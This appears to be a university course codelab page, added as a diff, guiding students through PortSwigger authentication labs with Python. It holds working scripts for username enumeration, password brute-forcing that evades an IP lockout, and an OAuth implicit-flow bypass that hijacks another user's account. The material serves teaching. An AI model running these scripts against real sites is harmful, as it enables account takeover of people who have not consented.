@@ -1,0 +1,254 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>1.3: Broken Authentication</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W1.3_broken_authentication" title="1.3: Broken Authentication" environment="web" feedback-link="https://docs.google.com/document/d/18_EdajNo5VJZb-Veg7CzVDCCiLA4Q8amzEzRF_Wg4J4">
+<google-codelab-step label="PortSwigger labs introduction" duration="2">
+<p>PortSwigger provides a comprehensive set of exercises for learning about web application vulnerabilities. The company produces a tool BurpSuite that is the de facto web penetration testing tool that many security professionals rely upon as it does not require any programming experience to use.</p>
+<p>As a CS class, one of the goals is to have you practice programming while learning web and cloud security. Since many security tools are written in Python, most of the codelabs will walk you through how to solve levels using short Python scripts that rely mostly upon packages such as <code>requests</code> and <code>BeautifulSoup</code>. It is recommended you attempt to solve all levels with Python, but you are welcome to use the community version of BurpSuite or Postman to solve the levels.</p>
+<p>Regardless of your method, for each exercise, include a screenshot of its completion with your OdinID (e.g. <code>wuchang</code>) for your lab notebook. Screenshots should include the unique URL you are given for the lab (in the URL bar), the completion message (in Orange), and your OdinID as shown below.</p>
+<p class="image-container"><img style="width:624px" src="img/2e0726add6030427.png"></p>
+<p>Note: you do not need to commit code into your repository for lab exercises that have not been assigned specifically as homework. </p>
+</google-codelab-step>
+<google-codelab-step label="Login form" duration="3">
+<p>We&#39;ll begin with a general overview of how authentication on the PortSwigger site is done via its login form. Visit the <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" target="_blank">first authentication level</a> and click &#34;Access the lab&#34; to instantiate it. Then, click &#34;My account&#34; which will redirect you to the login form at <code>/login</code>. Inspect the form by right-clicking the &#34;<code>Log in</code>&#34; button and then clicking &#34;<code>Inspect</code>&#34; to view the page via the browser&#39;s Developer Tools as shown below.</p>
+<p class="image-container"><img style="width:487px" src="img/6b1b4b17481a0514.png"></p>
+<p>The form that implements the login process is shown. As it shows, a POST to the <code>/login</code> URI with the form parameters named <code>username</code> and <code>password</code> taken from the user&#39;s input is performed when the button is clicked.</p>
+<pre><code>&lt;form class=login-form method=POST action=/login&gt;
+    &lt;label&gt;Username&lt;/label&gt;
+          &lt;input required type=username name=&#34;username&#34;&gt;
+    &lt;label&gt;Password&lt;/label&gt;
+          &lt;input required type=password name=&#34;password&#34;&gt;
+    &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+&lt;/form&gt;</code></pre>
+<p>Note that in some levels, an additional, hidden form parameter named <code>csrf</code> is included. The value of the parameter is generated randomly by the server and sent in the form to prevent a particular attack called cross-site request forgery (CSRF). We will cover CSRF later. If you are using a Python script to log into the site, it will need to be modified.</p>
+<p>With the developer console still open from inspecting the button, fIll out the form with your OdinID as your username and password and submit it. In the upper tabs of the Developer Tools interface, click on &#34;<code>Network</code>&#34;, then scroll up on the requests to find the initial form submission request the browser has sent (e.g. <code>login</code>). Then, select &#34;<code>Headers</code>&#34; as shown below. Scroll down to see the rest of the request headers as well as the body of the request. As the tools show, the form&#39;s POST submission includes the credentials entered.</p>
+<p class="image-container"><img style="width:624px" src="img/f67b88f9c92f424c.png"><br></p>
+<ul>
+<li><strong>Take a screenshot of this for your lab notebook</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="authentication/password-based (1)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" target="_blank">username-enumeration-via-different-responses</a></h2>
+<p>When implementing authentication, an incorrect username or password should yield the exact same response from the server. If different responses are returned, an adversary can quickly enumerate accounts. In this level, logging in with a bogus set of credentials gives us an error message that unfortunately gives us a hint that our username is invalid. To begin with, visit the Login page and bring up Developer Tools on it as before. On the form, enter a random string of characters into the fields and submit the form. As the output below shows, the form reveals that the <code>username</code> is incorrect via a &lt;<code>p</code>&gt; element with class <code>"is-warning"</code>. This is a vulnerability that allows us to brute-force a set of usernames to identify accounts that exist. Once we know an account exists, we can then brute-force a set of passwords to login.</p>
+<p class="image-container"><img style="width:624px" src="img/3f15c0eb7862f544.png"></p>
+<p>We first write code that performs a brute-force attack on a list of usernames supplied to us in a <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames" target="_blank">candidate list</a>. As shown below, the code first creates a new <code>requests.Session</code> object. This object emulates what a real browser session would do, accumulating cookies across multiple requests. Once we successfully login, a cookie will be set in the session that will then be used on subsequent requests to authorize access.</p>
+<pre><code>import requests
+from bs4 import BeautifulSoup
+
+s = requests.Session()</code></pre>
+<p>Each PortSwigger lab has a unique, randomly generated site name associated with it when you access the lab. Replace the &lt;<code>FMI</code>&gt; (e.g. Fill Me In) in the assignment for <code>site</code> variable with yours. </p>
+<pre><code>site = &#39;&lt;FMI&gt;.web-security-academy.net&#39;</code></pre>
+<p>Given the <code>site</code> name, we can then use a Python <code>f-string</code> (formatted string) to construct the URL for the login page on the site that we want to access. An <code>f-string</code> serves as a template that allows you to directly include values of variables via the curly braces (e.g. <code>{variable}</code>). Note the use of triple single-quotes to denote the string. We use this option since there will be many strings we use throughout our exercises that will contain either a single-quote or double-quote as part of it. The triple single-quotes obviates the need to escape these characters.</p>
+<pre><code>login_url = f&#39;&#39;&#39;https://{site}/login&#39;&#39;&#39;</code></pre>
+<p>We then open up the candidate username file and read all of the lines in the file into a list (<code>lines</code>).</p>
+<pre><code>lines = open(&#34;auth-lab-usernames&#34;,&#34;r&#34;).readlines()</code></pre>
+<p>Finally, for each line, we strip out the newline to obtain a username before using it to create a Python dictionary that encodes the username and the dummy password <code>foo.</code> Using the session, we then POST the form to the login URL to attempt to login as the username. We then parse the response object looking for the &lt;<code>p</code>&gt; element with the <code>'is-warning'</code> class to see if the username is valid.</p>
+<pre><code>for user in lines:
+    target = user.strip()
+    logindata = {
+        &#39;username&#39; : target,
+        &#39;password&#39; : &#39;foo&#39;
+    }
+    resp = s.post(login_url, data=logindata)
+    soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+    if &#39;username&#39; not in soup.find(&#39;p&#39;, {&#39;class&#39;:&#39;is-warning&#39;}).text:
+        print(f&#39;username is {target}&#39;)
+        break</code></pre>
+<p>Run the program to identify a valid username on the vulnerable site. Once you have found the username, adapt the loop above to then brute-force the user&#39;s password from the <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" target="_blank">candidate password file</a>. While in the examples above, we look for a &lt;<code>p</code>&gt; tag with an &#39;is-warning&#39; class to determine if our login was successful, there are also other ways for doing so. Other options include:</p>
+<ul>
+<li>Examining <code>resp.text</code> to see if &#34;<code>Invalid username</code>&#34; or &#34;<code>Incorrect password</code>&#34; appears.</li>
+<li>Disallowing redirection on our requests.post and checking for an HTTP redirect as the login page redirects you to the home page upon successful login.</li>
+<li>Accessing the account&#39;s profile page (at <code>/my-account?id={username}'</code>) and searching for a string in <code>resp.text</code> indicating the user account. For example &#34;<code>Hello, carlos</code>&#34; for when we have successfully logged in with <code>username = 'carlos'</code>. </li>
+</ul>
+<p>Solve the level by successfully logging in and accessing the profile page of the compromised account.</p>
+<pre><code>s.get(f&#39;https://{site}/my-account?id={target}&#39;)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="authentication/password-based (2)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block" target="_blank">broken-bruteforce-protection-ip-block</a></h2>
+<p>For this level, we already know the username of the account we want to hijack: <code>carlos</code>. We now need to find the matching password via brute-force. Unfortunately, the site will lock your IP address out if you get your password wrong too many times. However, we are given the legitimate credentials for another account (<code>wiener:peter</code>). We can reset the lockout counter that tracks incorrect login attempts if we successfully log into this account after every incorrect attempt on <code>carlos</code>&#39;s account. The code below logs in using the credentials given:</p>
+<pre><code>def login_wiener():
+    logindata = {
+        &#39;username&#39; : &#39;wiener&#39;,
+        &#39;password&#39; : &#39;peter&#39;
+    }
+    resp = s.post(login_url, data=logindata)</code></pre>
+<p>We can then add this <code>login_wiener</code> call to our prior password brute-forcing code to solve the level. </p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="authentication/password-based (3)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock" target="_blank">username-enumeration-via-account-lock</a></h2>
+<p>In this lab, there is no lockout mechanism if you give the site an incorrect <code>username</code>. However, if you give a correct username with an incorrect password multiple times, the site will eventually lock the particular user&#39;s account out. Unfortunately, this setup allows an attacker to brute-force valid usernames. To begin with, implement a function that attempts to login as a particular username using a bogus password &#39;<code>foo</code>&#39;. </p>
+<pre><code>def try_target(username):
+  ...
+  logindata = {
+      &#39;username&#39; : username,
+      &#39;password&#39; : &#39;foo&#39;
+  }
+  for i in range(6):
+      resp = s.post(login_url, data=logindata)
+  ...
+  return resp.text</code></pre>
+<p>If the username does not exist, you will receive the &#34;<code>Invalid username or password</code>&#34; message on every attempt. However, if the username exists and we attempt to login 5 times with an incorrect password, the warning that is returned changes to &#34;<code>You have made too many incorrect login attempts"</code>. With this knowledge we can test each username in the candidate username list 5 times with a bogus password and then look for this message to obtain a valid username.</p>
+<p>After obtaining the correct username, we can then see that the password checking logic also has a flaw. If we supply an incorrect password, we get the &#34;<code>You have made too many incorrect login attempts"</code> message. However, if the password is correct, nothing is returned. With the appropriate credentials, we can then wait 1 minute for the account lock to expire before logging in. At that time, we can login, click &#34;My Account&#34; and solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="oauth" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow" target="_blank">oauth-authentication-bypass-via-oauth-implicit-flow</a></h2>
+<p>The OAuth protocol provides a convenient way of implementing authentication as a service by allowing a third-party identity provider to authenticate a user on behalf of a client application. One of the issues with OAuth is its complexity. Unless properly implemented, OAuth can cause issues that allow it to be bypassed. In this lab, the client application supports authentication over OAuth via a social media account. The goal is to log into <code>carlos</code>&#39;s account using only an initial set of credentials for a different user.</p>
+<p>Begin by bringing up the Network tab of Developer Tools. At the top, click the check box to &#34;Preserve log&#34;. The authentication process contains many redirects that we will want to save and analyze.</p>
+<p class="image-container"><img style="width:624px" src="img/c42a9cc418cb7e3b.png"></p>
+<p>Then, click on &#34;My Account&#34; to begin the authentication process. In Developer Tools, find the initial request to <code>/my-account</code> and view its status code and response headers. As the response shows, this results in a redirection to a <code>/social-login</code> page. This page implements a 3 second delay before redirecting the user to the OAuth authorization URL located at the identity provider&#39;s site (e.g. <code>oauth-ace..web-security-academy.net/auth</code>).</p>
+<p class="image-container"><img style="width:624px" src="img/4e094c76ab5c4ec5.png"></p>
+<p>Click on this request to the authorization URL. Include answers to the following questions for your lab notebook.</p>
+<ul>
+<li><strong>What is the DNS name of the identity provider?</strong></li>
+<li><strong>What is the client_id that is sent to the identity provider as a URL parameter?</strong></li>
+<li><strong>What is the value of the redirect_uri (e.g. the client application&#39;s callback URL) that the identity provider will send the user back to after authentication and consent is performed?</strong></li>
+<li><strong>What scopes are being requested by the client application for the user to authorize?</strong></li>
+<li><strong>What kind of response_type is being requested from the identity provider?</strong></li>
+</ul>
+<p>View the response headers of the request.</p>
+<ul>
+<li><strong>What is the Location the user is sent to that implements the authentication login form on the identity provider&#39;s site?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<p>View the form on the sign-in page. It has two fields for the <code>username</code> and <code>password</code>.</p>
+<ul>
+<li><strong>What URL is the form data sent to when the user logs in as specified in the </strong><strong><code>action</code></strong><strong> attribute of the form?</strong></li>
+</ul>
+<p>With the Developer Tools still up, log in using the credentials given to you and view the network requests that are generated. Click on the form submission request and then on the &#34;Payload&#34; tab to see the credentials being sent. </p>
+<p class="image-container"><img style="width:624px" src="img/2e22d67e1f9d0086.png"></p>
+<p>Successful login redirects you to the consent page on the identity provider&#39;s site. The consent page asks the user to allow the client application access to the user&#39;s account information. View the page source and find the form that is submitted when the user clicks &#34;Continue&#34;.</p>
+<ul>
+<li><strong>What is the URL the form is sent to?</strong></li>
+</ul>
+<p>With the Developer Tools still up, click &#34;Continue&#34; and view the network requests. The confirmation page completes the authorization step and redirects the user to a page on the identity provider&#39;s site which will redirect the user back to the client application&#39;s callback URL with an authorization token attached. Click on this request to find the redirection that includes the token.</p>
+<p class="image-container"><img style="width:624px" src="img/5050cbe2887a76cd.png"></p>
+<ul>
+<li><strong>What is the access token the user will relay to the client application via its OAuth callback URL?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<p>The user has now returned to the client application with an access token obtained from the identity provider. So far, OAuth is working as intended. However, the client application has a flaw in its subsequent association of the social login identity with an account on its site. Rather than contacting the identity provider directly (via the <code>/me</code> API route on the identity provider) with the token given by the user to obtain the user&#39;s e-mail address, it has the user do so instead and trusts the user to relay its own identity back to the client application.</p>
+<p>To see this, click on the second request to <code>/me</code> that the user makes and view its request headers. (The first one is a CORS pre-flight request).</p>
+<p class="image-container"><img style="width:624px" src="img/8f172145f5ab26cf.png"></p>
+<p>As the request shows, the user sends its token in an <code>Authorization:</code> request header to <code>/me</code>. The OAuth site validates the token and returns the associated e-mail address. After getting its own e-mail address back from the OAuth site, the user then submits the e-mail address to the client application via a POST request to the client application&#39;s <code>/authenticate</code> URL. Click on this request and view the Payload that is sent.</p>
+<p class="image-container"><img style="width:624px" src="img/9f61aaec748b30d.png"></p>
+<ul>
+<li><strong>What is the e-mail address associated with the </strong><strong><code>wiener</code></strong><strong> account?</strong></li>
+</ul>
+<p>Unfortunately, the user can easily modify the email address that is posted to <code>/authenticate</code> in an attempt to gain access to the client application as a different user. The goal of the level is to obtain access as <code>carlos</code> whose account is associated with the e-mail address <a href="mailto:carlos@carlos-montoya.net" target="_blank"><code>carlos@carlos-montoya.net</code></a>. By using this address in the payload above instead, we can hijack <code>carlos</code>&#39;s account and solve the level. We will programmatically do this via Python.</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<p>The first part of the Python script imports the packages we need including the regular expression package to help us parse responses. It then retrieves the social login page from the client application. The page contains a &lt;<code>meta</code>&gt; tag that waits 3 seconds and redirects the user to the identity provider&#39;s authorization URL. Set the site value and run the script to obtain the authorization URL that contains the login form.</p>
+<pre><code>import requests
+from bs4 import BeautifulSoup
+import re
+site = &#39;&lt;FMI&gt;&#39;
+
+s = requests.Session()
+login_url = f&#39;https://{site}/social-login&#39;
+resp = s.get(login_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+meta = soup.find(&#39;meta&#39;, {&#39;http-equiv&#39;:&#39;refresh&#39;})
+print(f&#39;Meta tag is: {meta}&#39;)
+
+auth_url = meta[&#39;content&#39;].split(&#39;;&#39;)[1].lstrip(&#39;url=&#39;)
+print(f&#39;Authorization URL is: {auth_url}&#39;)
+oauth_site = auth_url.split(&#39;/&#39;)[2]
+print(f&#39;Identity provider site is: {oauth_site}&#39;)</code></pre>
+<p>The next part fetches the authorization URL, parses the form to obtain the login URL, then performs the login by posting the given credentials. The identity provider then performs a redirection to the consent page automatically. The script parses the consent page to find the URL of the form that implements the &#34;Continue&#34; button. </p>
+<pre><code>resp = s.get(auth_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+login = soup.find(&#39;form&#39;)
+login_url = f&#34;https://{oauth_site}{login[&#39;action&#39;]}&#34;
+print(f&#39;Sign-in URL is: {login_url}&#39;)
+login_data = {
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;password&#39; : &#39;peter&#39;
+}
+resp = s.post(login_url, data=login_data)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+cont = soup.find(&#39;form&#39;)
+cont_url = f&#34;https://{oauth_site}{cont[&#39;action&#39;]}&#34;
+print(f&#39;Continue URL is: {cont_url}&#39;)</code></pre>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<p>Next, the script will submit the form to continue and manually follow the first redirection back to the authorization URL and then the second redirection back to the callback URL back on the client application. As part of the redirection back to the callback, an authorization token is included. The script parses this token from the URL and prints it.</p>
+<pre><code>resp = s.post(cont_url, allow_redirects=False)
+redir_url_1 = resp.headers[&#34;Location&#34;]
+print(f&#39;First redirection back to authorization URL: {redir_url_1}&#39;)
+resp = s.get(redir_url_1, allow_redirects=False)
+redir_url_2 = resp.headers[&#34;Location&#34;]
+print(f&#39;Second redirection back to callback URL of client application containing token: {redir_url_2}&#39;)
+token = re.split(&#39;[#&amp;]&#39;,redir_url_2)[1].split(&#39;=&#39;)[1]
+print(f&#39;Token in oauth-callback is {token}&#39;)</code></pre>
+<p>When the user is redirected to the OAuth callback URL on the client application, it kicks off the entire, vulnerable implicit flow. The Python code below retrieves the callback URL given in the redirection. Run it and examine the script that is returned. </p>
+<pre><code>resp = s.get(redir_url_2)
+print(f&#39;Callback URL response returns: {resp.text}&#39;)</code></pre>
+<p>The implicit flow is implemented within this script. Answer the questions below for your lab notebook.</p>
+<ul>
+<li><strong>What is the function of the first two </strong><strong><code>const</code></strong><strong> lines?</strong></li>
+<li><strong>What content is being retrieved from the identity provider in the first </strong><strong><code>fetch</code></strong><strong>?</strong></li>
+<li><strong>What 3 values are being sent to the client application in the second </strong><strong><code>fetch</code></strong><strong>?</strong></li>
+<li><strong>What location is the user redirected to at the end of the implicit flow?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<p>We can now subvert the flow of requests shown in the previous step to hijack <code>carlos</code>&#39;s account. We begin by performing the first fetch to the identity provider, including the token in an <code>Authorization: Bearer</code> header. This returns the e-mail address of the account we logged in with.</p>
+<pre><code>resp = s.get(redir_url_2)
+print(f&#39;Javascript contains: {resp.text}&#39;)
+
+me_url = f&#39;https://{oauth_site}/me&#39;
+me_headers = {
+    &#39;Authorization&#39; : f&#39;Bearer {token}&#39;,
+    &#39;Content-Type&#39; : &#39;application/json&#39;
+}
+resp = s.get(me_url, headers=me_headers)
+print(f&#39;/me gets user information: {resp.text}&#39;)</code></pre>
+<p>Rather than use the information we obtain from this request for the subsequent request to the client application&#39;s <code>/authenticate</code> end-point. We substitute <code>carlos</code>&#39;s e-mail address instead and solve the level.</p>
+<pre><code>authenticate_url = f&#39;https://{site}/authenticate&#39;
+authenticate_data = {
+    &#39;email&#39; : &#39;carlos@carlos-montoya.net&#39;,
+    &#39;username&#39; : &#39;carlos&#39;,
+    &#39;token&#39; : token
+}
+authenticate_headers = {
+    &#39;Accept&#39; : &#39;application/json&#39;,
+    &#39;Content-Type&#39; : &#39;application/json&#39;
+}
+resp = s.post(authenticate_url, json=authenticate_data, headers=authenticate_headers)
+print(resp.text)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
